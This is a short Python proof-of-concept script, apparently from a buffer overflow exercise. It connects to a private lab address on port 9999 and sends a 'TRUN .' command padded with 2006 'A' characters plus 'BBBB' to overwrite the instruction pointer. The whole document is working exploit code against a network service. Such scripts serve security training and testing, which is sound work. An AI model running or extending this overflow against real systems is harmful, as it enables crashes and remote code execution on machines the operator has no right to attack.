#!/usr/bin/python
import socket

buffstring = "A" * 2006
eipoverwrite="BBBB"

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.19.130', 9999))
s.recv(50)
s.send('TRUN .' + buffstring + eipoverwrite)
s.close()
